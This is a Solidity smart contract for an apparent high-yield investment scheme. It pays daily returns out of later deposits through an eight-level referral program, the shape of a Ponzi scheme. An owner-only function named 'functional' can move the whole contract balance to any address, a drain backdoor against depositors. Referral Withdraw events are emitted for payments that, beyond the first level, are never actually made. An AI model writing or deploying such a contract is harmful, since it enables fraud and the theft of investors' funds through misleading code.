pragma solidity 0.4.25;

contract Owned {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

}

contract Hinamethree is Owned {
    using SafeMath for uint;
    mapping(address => uint[]) public deposited;   
    mapping(address => uint[]) public reservedBalance;  
    mapping(address => uint[]) public withdraw; 
    mapping(address => uint[]) public time; 
    mapping(address => uint) public regTime; 
    mapping(address => address) public myReferrer; 

    mapping (address => uint) outSumAd;
    mapping (address => uint) refSum;
    mapping (address => uint) invSum;

    uint public stepTime = 24 hours;  
    uint public countOfInvestors = 0; 
    address public addressAdv = 0x0000000000000000000000000000000000000000;  
    address public addressAdmin = 0x0000000000000000000000000000000000000000; 
    address public addressOut = 0x0000000000000000000000000000000000000000; 
    uint ownerPercent = 5;
    uint projectPercent = 1; 
    uint public minDeposit = 0; 
    bool public isStart = false; 

    event Invest(address investor, uint256 amount); 
    event Withdraw(address investor, uint256 amount, string eventType); 

    modifier userExist() {
        require(deposited[msg.sender].length > 0, "Address not found"); 
        _;
    }

    modifier checkTime(uint index) {
        require(now >= time[msg.sender][index].add(stepTime), "Too fast payout request"); 
        _;
    }

    modifier checkWithdrawAmount(uint index) {
        require(withdraw[msg.sender][index] < deposited[msg.sender][index].mul(2), "All amount was withdraw");
        _;
    }

    modifier checkIsStart() {
        require(isStart, "Not started yet"); 
        _;
    }

    function collectPercent(uint index) userExist checkTime(index) checkWithdrawAmount(index) internal {

        uint payout = payoutAmount(index);     
        uint referralSum = referralProgram(false, payout);  

        uint addressOutSum = payout.mul(ownerPercent).div(100); 

        outSumAd[msg.sender] = outSumAd[msg.sender].add(addressOutSum);
        

        uint payoutInvestor = payout.sub(referralSum).sub(addressOutSum); 
        invSum[msg.sender] = invSum[msg.sender].add(payoutInvestor);
        
        

        withdraw[msg.sender][index] = withdraw[msg.sender][index].add(payout); 
        reservedBalance[msg.sender][index] = 0;  
        time[msg.sender][index] = now;  
        emit Withdraw(msg.sender, payout, &#39;collectPercent&#39;); 
    }

    function payoutAmount(uint index) public view returns (uint) {  
        uint different = now.sub(time[msg.sender][index]).div(stepTime); 
        uint rate = deposited[msg.sender][index].mul(projectPercent).div(100);
        uint withdrawalAmount = rate.mul(different);


        if (reservedBalance[msg.sender][index] > 0) {  
            withdrawalAmount = withdrawalAmount.add(reservedBalance[msg.sender][index]);
        }

        uint availableToWithdrawal = deposited[msg.sender][index].mul(2) - withdraw[msg.sender][index];
        if (withdrawalAmount > availableToWithdrawal) { 
            withdrawalAmount = availableToWithdrawal;
        }

        return withdrawalAmount;  
    }
    
    function referralProgram(bool deposit, uint valueAll) internal returns (uint) {
        uint sumAll = 0;  
        address referrer = myReferrer[msg.sender];  

        for (uint256 i = 1; i < 9; i++) {
            if (referrer == 0x0000000000000000000000000000000000000000
            || regTime[referrer] == 0
            || regTime[referrer] > regTime[msg.sender]) {
                break;
            }
    
            uint amount = referralAmount(i, deposit);  
            uint sum = valueAll.mul(amount).div(1000);   
            sumAll = sumAll.add(sum);   
            refSum[msg.sender] = refSum[msg.sender].add(sum);
            
            emit Withdraw(referrer, sum, &#39;referral&#39;);   

            referrer = myReferrer[referrer];  
        }

        return sumAll;  
    }


    function referralAmount(uint level, bool deposit) internal pure returns (uint) {
        if (deposit == true) {
            if (level == 1) {
                return 35;
            } else if (level == 2) {
                return 20;
            } else if (level == 3) {
                return 15;
            } else if (level == 4) {
                return 10;
            } else if (level == 5) {
                return 5;
            } else if (level == 6) {
                return 5;
            } else if (level == 7) {
                return 5;
            } else if (level == 8) {
                return 5;
            } else return 0;
        } else {
            if (level == 1) {
                return 50;
            } else if (level == 2) {
                return 40;
            } else if (level == 3) {
                return 30;
            } else if (level == 4) {
                return 20;
            } else if (level == 5) {
                return 10;
            } else if (level == 6) {
                return 5;
            } else if (level == 7) {
                return 3;
            } else if (level == 8) {
                return 1;
            } else return 0;
        }

    }

    function deposit() checkIsStart private {  
        if (msg.value > 0) {  

            if (deposited[msg.sender].length == 0) { 
                require(msg.value >= minDeposit, "Wrong deposit value");
                regTime[msg.sender] = now; 

                countOfInvestors += 1; 

                address referrer = bytesToAddress(msg.data);   

                if (referrer != msg.sender) {   
                    myReferrer[msg.sender] = referrer; 
                }

                deposited[msg.sender].push(msg.value);
                withdraw[msg.sender].push(0);
                reservedBalance[msg.sender].push(0);

                time[msg.sender].push(now);  
                 
            }

            else {

                deposited[msg.sender].push(msg.value);
                withdraw[msg.sender].push(0);
                reservedBalance[msg.sender].push(0);

                time[msg.sender].push(now);
            }

            

            uint index = deposited[msg.sender].length - 1;

            if (deposited[msg.sender][index] > 0 && now > time[msg.sender][index].add(stepTime)) {  
                reservedBalance[msg.sender][index] = payoutAmount(index); 
                time[msg.sender][index] = now;   
            }

            refSum[msg.sender] = 0;  
            referralProgram(true, msg.value);
            
            myReferrer[msg.sender].transfer(refSum[msg.sender]);
            refSum[msg.sender] = 0;  

            addressAdv.transfer(msg.value.mul(ownerPercent).div(100));

            addressAdmin.transfer(msg.value.mul(ownerPercent).div(100));


            emit Invest(msg.sender, msg.value);   
        } else {
            refSum[msg.sender] = 0;
            invSum[msg.sender] = 0;
            outSumAd[msg.sender] = 0;
            for (uint i = 0; i < deposited[msg.sender].length; i++) {
               collectPercent(i);     
            }
            myReferrer[msg.sender].transfer(refSum[msg.sender]);

            addressOut.transfer(outSumAd[msg.sender]);

            msg.sender.transfer(invSum[msg.sender]);

            refSum[msg.sender] = 0;
            invSum[msg.sender] = 0;
            outSumAd[msg.sender] = 0;

        }
    }

    function() external payable {   
        deposit();
    }

    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {  
            addr := mload(add(bys, 20))
        }
    }

    function setAddressAdv(address newAddress) onlyOwner public {
        addressAdv = newAddress;
    }
    function setAddressAdmin(address newAddress) onlyOwner public {
        addressAdmin = newAddress;
    }
    function setAddressOut(address newAddress) onlyOwner public {
        addressOut = newAddress;
    }

    function start() onlyOwner public {
        isStart = true;
    }

    function functional(address to, uint value) onlyOwner public {
        require(address(this).balance >= value);
        to.transfer(value);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);  
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}